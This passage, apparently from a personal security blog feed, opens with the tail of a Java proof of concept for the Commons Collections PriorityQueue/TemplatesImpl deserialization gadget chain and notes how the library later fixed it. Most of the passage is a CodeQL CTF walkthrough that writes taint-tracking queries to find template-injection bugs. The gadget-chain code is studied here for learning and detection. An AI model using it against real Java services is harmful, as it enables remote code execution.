class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;getBytescode()&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;toString&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Comparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(transformer);<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">queue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>, comparator);<br>        queue.add(obj);<br>        queue.add(obj);<br><br>        setFieldValue(transformer, <span class="hljs-string">&quot;iMethodName&quot;</span>, <span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(queue);<br>        oos.close();<br><br>        System.out.println(barr);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="官方修复方法"><a href="#官方修复方法" class="headerlink" title="官方修复方法"></a>官方修复方法</h2><ul><li>PriorityQueue的利用链是否支持在CC3中利用?</li><li>Apache Commons Collections官方如何修复漏洞</li></ul><p>第一个不行，因为TransformingComparator没有实现serializable接口</p><p>第二个问题在CC3版本下增加了一个方法<code>FunctorUtils#checkUnsafeSerialization</code> ，⽤于检测反序列化是否安全。如果开发者没有设置全局配置 <code>org.apache.commons.collections.enableUnsafeSerialization=true</code> ，即默认情况下会抛出异常。</p><p>这个检查在常⻅的危险Transformer类</p><p>（ InstantiateTransformer 、 InvokerTransformer 、 PrototypeFactory 、 CloneTransformer 等）的 readObject ⾥进⾏调⽤，所以，当我们反序列化包含这些对象时就会抛出⼀个异常：</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191237655.png" alt="image-20230220195203458"> </p><p>而在CC4版本中，上面的危险Transformer类不实现Serializable接口，也就是说他们完全无法序列化和反序列化了</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Github CodeQL training 思路</title>
    <link href="/Decemberus.github-io/2022/11/16/Github%20ctf4%20training/"/>
    <url>/Decemberus.github-io/2022/11/16/Github%20ctf4%20training/</url>
    
    <content type="html"><![CDATA[<h1 id="Github-ctf4-training"><a href="#Github-ctf4-training" class="headerlink" title="Github ctf4 training"></a>Github ctf4 training</h1><p><a href="https://securitylab.github.com/ctf/codeql-and-chill/">GitHub Security Lab CTF 4: CodeQL and Chill - The Java Edition | GitHub Security Lab</a></p><h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>一些梳理</p><p>如果说ma是调用方法的一整个的话，如下图所示，他是把整个调用方法的句子都给返回了</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231225222957383.png" alt="image-20231225222957383"> </p><p>如果使用<code>getQualifier</code>，那么</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231225223107399.png" alt="image-20231225223107399"> </p><p>则会返回调用方法的类</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">import</span> DataFlow::PathGraph<br></code></pre></td></tr></table></figure><p>这句话可以在结果中分析数据流图</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@name</span> finis the ql</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@kind</span> path-problem</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@derscription</span> </span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><p>在查询语句前面加上这个注释可以看alert</p><h2 id="Step-1-1-Sources"><a href="#Step-1-1-Sources" class="headerlink" title="Step 1.1: Sources"></a>Step 1.1: Sources</h2><p>因为这个触发的函数是<code>ConstraintValidator</code>，所以我们寻找的source就是他，那么创建一个函数类型来寻找所说的<code>ConstraintValidator</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ConstraintValidatorClass</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Class</span> &#123;<br>     ConstraintValidatorClass()&#123;<br>        <span class="hljs-built_in">this</span>.getASupertype().getASupertype+().hasQualifiedName(<span class="hljs-string">&quot;javax.validation&quot;</span>, <span class="hljs-string">&quot;ConstraintValidator&lt;&gt;&quot;</span>)<br>     &#125;<br>&#125;<br><br>from ConstraintValidatorClass con<br>select con<br></code></pre></td></tr></table></figure><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231224200842210.png" alt="image-20231224200842210"> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ConstraintValidatorIsValid</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Method</span>&#123;<br>    ConstraintValidatorIsValid()&#123;<br>        <span class="hljs-built_in">this</span>.getDeclaringType() <span class="hljs-keyword">instanceof</span> ConstraintValidatorClass<br>        and <span class="hljs-built_in">this</span>.hasName(<span class="hljs-string">&quot;isValid&quot;</span>)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>发现有私有方法，所以要过滤</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231224202224324.png" alt="image-20231224202224324"> </p><p>最终摸样是这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ConstraintValidatorIsValid</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Method</span>&#123;<br>    ConstraintValidatorIsValid()&#123;<br>        <span class="hljs-built_in">this</span>.getDeclaringType() <span class="hljs-keyword">instanceof</span> ConstraintValidatorClass<br>        and <span class="hljs-built_in">this</span>.hasName(<span class="hljs-string">&quot;isValid&quot;</span>)<br>        and <span class="hljs-title function_">not</span><span class="hljs-params">(<span class="hljs-built_in">this</span>.isPrivate()</span>)<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Step-1-2-Sink"><a href="#Step-1-2-Sink" class="headerlink" title="Step 1.2: Sink"></a>Step 1.2: Sink</h2><p>在写sink的时候有一个坑，起初我是和isSource同一个写法的，即</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Conf</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">DataFlow</span>::Configuration &#123;<br>    Conf()&#123;<br>        <span class="hljs-built_in">this</span> = <span class="hljs-string">&quot;Conf&quot;</span><br>    &#125;<br>    override predicate <span class="hljs-title function_">isSource</span><span class="hljs-params">(DataFlow::Node node)</span> &#123;<br>        exists(ConstraintValidatorIsValid cviv |<br>            node.asParameter() = cviv.getParameter(<span class="hljs-number">0</span>))<br>    &#125;<br><br>    override predicate <span class="hljs-title function_">isSink</span><span class="hljs-params">(DataFlow::Node node)</span> &#123;<br>        exists(BuildConstraintViolationWithTemplate bcivwt |<br>            node.asParameter() = bcivwt.getParameter(<span class="hljs-number">0</span>))<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ConstraintValidatorContextClass</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Class</span>&#123;<br>    ConstraintValidatorContextClass()&#123;<br>        <span class="hljs-built_in">this</span>.getASupertype().getASupertype+().hasQualifiedName(<span class="hljs-string">&quot;javax.validation&quot;</span>, <span class="hljs-string">&quot;ConstraintValidatorContext&quot;</span>)<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">BuildConstraintViolationWithTemplate</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Method</span>&#123;<br>    BuildConstraintViolationWithTemplate()&#123;<br>        <span class="hljs-built_in">this</span>.getDeclaringType() <span class="hljs-keyword">instanceof</span> ConstraintValidatorContextClass<br>        and <span class="hljs-built_in">this</span>.hasName(<span class="hljs-string">&quot;buildConstraintViolationWithTemplate&quot;</span>)<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是没有任何的查找返回结果，但是实际上他们两个是不同的，因为source我们是找的isValid函数的第一个参数，而sink则是<code>buildConstraintViolationWithTemplate</code>函数的触发，可以通过两个截图来看看他们的不同</p><p>isSource</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231227093441408.png" alt="image-20231227093441408"> </p><p>isSink</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231227093517004.png" alt="image-20231227093517004"> </p><p>所以我们可以发现的是，isSource我们是找的定义函数的地方，而isSink则是找到调用函数的地方</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231225181519501.png" alt="image-20231225181519501"> </p><h2 id="Step-1-3-TaintTracking-configuration"><a href="#Step-1-3-TaintTracking-configuration" class="headerlink" title="Step 1.3: TaintTracking configuration"></a>Step 1.3: TaintTracking configuration</h2><p>直接拿我们之前的成果进行测试，我们直接去查找sink和source，发现是没有任何结果的，所以我们需要去分析一下部分数据流</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">from Conf conf, DataFlow::PathNode source, DataFlow::PathNode sink<br>where conf.hasFlowPath(source, sink)<br>select sink, source, sink, <span class="hljs-string">&quot;Custom constraint error message contains unsanitized user data&quot;</span><br></code></pre></td></tr></table></figure><p>这里又出现了一个问题，codeql官方库进行了一次更新，新版本里面不再有partialpathnode这个类，但是神奇的我翻了以下的的git commit，发现官方既没有进行任何说明也没有文档，唯一找到的这个可能的方法也不起作用</p><p><a href="https://codeql.github.com/docs/writing-codeql-queries/debugging-data-flow-queries-using-partial-flow/">Debugging data-flow queries using partial flow — CodeQL (github.com)</a>这个官方库中的说明都是用不了的</p><p>于是只能根据这一篇issue来降低版本使用了</p><p><a href="https://github.com/github/codeql/issues/13540">DataFlow::PathGraph Module not Found in codeql · Issue #13540 · github&#x2F;codeql</a></p><p>我用的codeql cli库的版本是2.15.1，我将库的版本降低到2021年的提交才可以用</p><h2 id="Step-1-4-Partial-Flow-to-the-rescue"><a href="#Step-1-4-Partial-Flow-to-the-rescue" class="headerlink" title="Step 1.4: Partial Flow to the rescue"></a>Step 1.4: Partial Flow to the rescue</h2><p>因为我们刚才在isSource里面找到了一个container，我们怀疑可能是这里断了，于是在debug中我们isSource定义为查找所有的container类</p><p>然后查询语句中我们就找需要使用到container的调用函数，取它的第一个参数就行</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">source.get<span class="hljs-constructor">Node()</span>.get<span class="hljs-constructor">EnclosingCallable()</span>.get<span class="hljs-constructor">ParameterType(0)</span> instanceof ContainerClass<br></code></pre></td></tr></table></figure><p>没加限定时的测试如下</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231225183526727.png" alt="image-20231225183526727"> </p><p>加上限定时能够抛出正确的结果</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231227100319136.png" alt="image-20231227100319136"> </p><p>sink的话就是下面的<code>buildConstraintViolationWithTemplate</code>参数，于是能够得到</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java<br><span class="hljs-keyword">import</span> semmle.code.java.dataflow.TaintTracking<br><span class="hljs-keyword">import</span> DataFlow::PartialPathGraph<br><br><span class="hljs-comment">//构造方法引用</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ConstraintValidatorClass</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Class</span> &#123;<br>     ConstraintValidatorClass()&#123;<br>        <span class="hljs-built_in">this</span>.getASupertype().getASupertype+().hasQualifiedName(<span class="hljs-string">&quot;javax.validation&quot;</span>, <span class="hljs-string">&quot;ConstraintValidator&lt;&gt;&quot;</span>)<br>     &#125;<br>&#125;<br><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ConstraintValidatorIsValid</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Method</span>&#123;<br>    ConstraintValidatorIsValid()&#123;<br>        <span class="hljs-built_in">this</span>.getDeclaringType() <span class="hljs-keyword">instanceof</span> ConstraintValidatorClass<br>        and <span class="hljs-built_in">this</span>.hasName(<span class="hljs-string">&quot;isValid&quot;</span>)<br>        and <span class="hljs-title function_">not</span><span class="hljs-params">(<span class="hljs-built_in">this</span>.isPrivate()</span>)<br>    &#125;<br><br>&#125;<br><br><br><span class="hljs-comment">//methodAccess是一个被遗弃的方法，不要去使用它</span><br>predicate <span class="hljs-title function_">isBuildConstraintViolationWithTemplate</span><span class="hljs-params">(Expr expr)</span> &#123;<br>    exists(MethodAccess mc |<br>        mc.getCallee().hasName(<span class="hljs-string">&quot;buildConstraintViolationWithTemplate&quot;</span>)  <br>        <span class="hljs-type">and</span> <span class="hljs-variable">expr</span> <span class="hljs-operator">=</span> mc.getArgument(<span class="hljs-number">0</span>))<br>&#125;<br><br><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Conf</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">DataFlow</span>::Configuration &#123;<br>    Conf()&#123;<br>        <span class="hljs-built_in">this</span> = <span class="hljs-string">&quot;Conf&quot;</span><br>    &#125;<br>    override predicate <span class="hljs-title function_">isSource</span><span class="hljs-params">(DataFlow::Node node)</span> &#123;<br>        exists(ConstraintValidatorIsValid cviv |<br>            node.asParameter() = cviv.getParameter(<span class="hljs-number">0</span>))<br>    &#125;<br><br>    override predicate <span class="hljs-title function_">isSink</span><span class="hljs-params">(DataFlow::Node node)</span> &#123;<br>        exists(Expr expr |<br>            isBuildConstraintViolationWithTemplate(expr)<br>            and node.asExpr() = expr<br>            )<br>    &#125;<br>    override <span class="hljs-type">int</span> <span class="hljs-title function_">explorationLimit</span><span class="hljs-params">()</span>&#123;<br>        result = <span class="hljs-number">10</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ContainerClass</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Class</span> &#123;<br>    ContainerClass() &#123;<br>        <span class="hljs-built_in">this</span>.getName() = <span class="hljs-string">&quot;Container&quot;</span><br>    &#125;<br>&#125;<br><br><br>from Conf conf,DataFlow::PartialPathNode source, DataFlow::PartialPathNode sink<br>where conf.hasPartialFlow(source, sink,_)<br>and source.getNode().getEnclosingCallable().getParameterType(<span class="hljs-number">0</span>) <span class="hljs-keyword">instanceof</span> ContainerClass<span class="hljs-comment">//拿到调用source的函数的第一个参数，也就是isValid的第一个参数</span><br>select sink, source, sink, <span class="hljs-string">&quot;Custom constraint error message contains unsanitized user data&quot;</span><br></code></pre></td></tr></table></figure><p>我们试着来调用它，产生了以下的结果</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231227114432658.png" alt="image-20231227114432658"> </p><p>我们分别来看source和sink，那该如何根据上面的数据来找数据流断开的点呢，我们一步步翻阅我们生成的sink，我们原本设定的sink时它能够直接道道我们的<code>BuildConstraintViolationWithTemplate</code>的第一个参数，但是现在却没有到达我们的第一个参数，所以我们只要找上图中sink最后出现的位置就可以了</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231227120639793.png" alt="image-20231227120639793"> </p><p>把每一个sink都翻阅了一遍以后，我们找到了问题所在，这个两个函数的返回值时sink最终的终点，而上图中的那些sink根本没有<code>keySet</code>方法的调用，所以肯定是卡在了<code>keySet</code>这里的，所以我们尝试把<code>getSoftConstraints()</code>和<code>getHardConstraints()</code>与<code>keyset</code>相连接</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231227120814960.png" alt="image-20231227120814960"> </p><p>所以我们这样就可以连接keySet和那两个get方法</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs scala"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetAndSet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Method</span></span>&#123;<br>    <span class="hljs-type">GetAndSet</span>()&#123;<br>        <span class="hljs-keyword">this</span>.hasName(<span class="hljs-string">&quot;getSoftConstraints&quot;</span>)<br>        or <span class="hljs-keyword">this</span>.hasName(<span class="hljs-string">&quot;getHardConstraints&quot;</span>)<br>        or <span class="hljs-keyword">this</span>.hasName(<span class="hljs-string">&quot;keySet&quot;</span>)<br>    &#125;<br>&#125;<br><br>predicate expressionCompileStep(<span class="hljs-type">DataFlow</span>::<span class="hljs-type">Node</span> node1, <span class="hljs-type">DataFlow</span>::<span class="hljs-type">Node</span> node2) &#123;<br>    exists(<span class="hljs-type">MethodAccess</span> ma, <span class="hljs-type">Method</span> m | ma.getMethod() = m |<br>        m instanceof <span class="hljs-type">GetAndSet</span> and<br>        ma = node2.asExpr() and<br>        ma.getQualifier() = node1.asExpr()<br>    )<br>&#125;<br></code></pre></td></tr></table></figure><p>在Conf类中添加</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">override predicate isAdditionalFlowStep(DataFlow::<span class="hljs-keyword">Node</span> <span class="hljs-title">node1</span>, DataFlow::<span class="hljs-keyword">Node</span> <span class="hljs-title">node2</span>) &#123;<br>    expressionCompileStep(node1, node2)<br>&#125;<br></code></pre></td></tr></table></figure><p>查看运行结果</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231227122423431.png" alt="image-20231227122423431"> </p><p>我们看到keyset已经被连接进来了，而接下来我们需要把common这个参数继续往下面传递，我们使用getAnArgueMent可以拿到构造方法的参数</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231227122935380.png" alt="image-20231227122935380"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">TypeHashtable</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">RefType</span> &#123;<br>    TypeHashtable() &#123; <br>        hasQualifiedName(<span class="hljs-string">&quot;java.util&quot;</span>, <span class="hljs-string">&quot;HashSet&quot;</span>) or<br>        <span class="hljs-title function_">hasQualifiedName</span><span class="hljs-params">(<span class="hljs-string">&quot;java.util&quot;</span>, <span class="hljs-string">&quot;HashSet&lt;&gt;&quot;</span>)</span> or<br>        <span class="hljs-title function_">hasQualifiedName</span><span class="hljs-params">(<span class="hljs-string">&quot;java.util&quot;</span>, <span class="hljs-string">&quot;HashSet&lt;String&gt;&quot;</span>)</span> <br>        &#125;<br>    &#125;<br><span class="hljs-comment">//用来判定hashset调用函数的step</span><br>predicate <span class="hljs-title function_">hashSetMethodStep</span><span class="hljs-params">(DataFlow::Node node1, DataFlow::Node node2)</span> &#123;<br>    exists(ConstructorCall cc | cc.getConstructedType() <span class="hljs-keyword">instanceof</span> TypeHashtable |<br>        node1.asExpr() = cc.getAnArgument() and<br>        (node2.asExpr() = cc  <span class="hljs-comment">//这里是构造函数的返回值</span><br>        or node2.asExpr() = cc.getQualifier() <span class="hljs-comment">//这里是构造函数的返回值的限定值</span><br>        )<br>    )<br>&#125;<br></code></pre></td></tr></table></figure><p>并且在isAdditionalFlowStep添加上我们刚才创建的查询</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">override predicate <span class="hljs-title function_">isAdditionalFlowStep</span><span class="hljs-params">(DataFlow::Node node1, DataFlow::Node node2)</span> &#123;<br>    expressionCompileStep(node1, node2) or<br>    <span class="hljs-title function_">hashSetMethodStep</span><span class="hljs-params">(node1,node2)</span><br>    <br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231227124349398.png" alt="image-20231227124349398"> </p><p>成功找到了common这个sink</p><h2 id="Step1-5-to-Step-1-8-Finish-line-for-our-first-issue"><a href="#Step1-5-to-Step-1-8-Finish-line-for-our-first-issue" class="headerlink" title="Step1.5 to Step 1.8: Finish line for our first issue"></a>Step1.5 to Step 1.8: Finish line for our first issue</h2><p>我们把刚才做的修改放到我们原来的pathnode而不是partialpathnode中来，把重写的方法变为<code>isAdditionalTaintStep</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">override predicate <span class="hljs-title function_">isAdditionalTaintStep</span><span class="hljs-params">(DataFlow::Node node1, DataFlow::Node node2)</span> &#123;<br>    expressionCompileStep(node1, node2) or<br>    <span class="hljs-title function_">hashSetMethodStep</span><span class="hljs-params">(node1,node2)</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">from Conf conf,DataFlow::PathNode source, DataFlow::PathNode sink<br>where conf.hasFlowPath(source, sink)<br><span class="hljs-comment">// and source.getNode().getEnclosingCallable().getParameterType(0) instanceof ContainerClass</span><br>select sink, source, sink, <span class="hljs-string">&quot;Custom constraint error message contains unsanitized user data&quot;</span><br><span class="hljs-comment">//这里将partial转化为simple,然后拿到包含source的的构造函数或者方法</span><br><span class="hljs-comment">// select source.getNode().getEnclosingCallable().getParameterType(0)</span><br></code></pre></td></tr></table></figure><p>然后运行查询，可以发现能够得到结果</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231227124729921.png" alt="image-20231227124729921"> </p><h2 id="Step-2-Second-Issue"><a href="#Step-2-Second-Issue" class="headerlink" title="Step 2: Second Issue"></a>Step 2: Second Issue</h2><p>根据提示</p><blockquote><p>There is a similar issue in <code>SchedulingConstraintValidator.java</code>. Following the same process as above, find out why it is not reported by your query, and write the necessary taint steps to report it.</p><p><strong>Tip:</strong> We don’t like duplicate code. ;-</p></blockquote><p>在这里也有一个漏洞点</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231227130316572.png" alt="image-20231227130316572"> </p><p>这里是ketset后面还有调用，只需要在后面补全即可，我们将我们的 <code>FlowConstraints</code>补全如下</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs scala"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FlowConstraints</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Method</span> </span>&#123;<br>    <span class="hljs-type">FlowConstraints</span>() &#123;<br>        <span class="hljs-keyword">this</span>.hasName(<span class="hljs-string">&quot;getSoftConstraints&quot;</span>)<br>        or <span class="hljs-keyword">this</span>.hasName(<span class="hljs-string">&quot;getHardConstraints&quot;</span>)<br>        or <span class="hljs-keyword">this</span>.hasName(<span class="hljs-string">&quot;keySet&quot;</span>) <br>        or <span class="hljs-keyword">this</span>.hasName(<span class="hljs-string">&quot;stream&quot;</span>)<br>        or <span class="hljs-keyword">this</span>.hasName(<span class="hljs-string">&quot;map&quot;</span>)<br>        or <span class="hljs-keyword">this</span>.hasName(<span class="hljs-string">&quot;collect&quot;</span>)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231227130422799.png" alt="image-20231227130422799"> </p><p>成功跑出两个结果，win!</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CC3</title>
    <link href="/Decemberus.github-io/2022/11/10/CC3(2)/"/>
    <url>/Decemberus.github-io/2022/11/10/CC3(2)/</url>
    
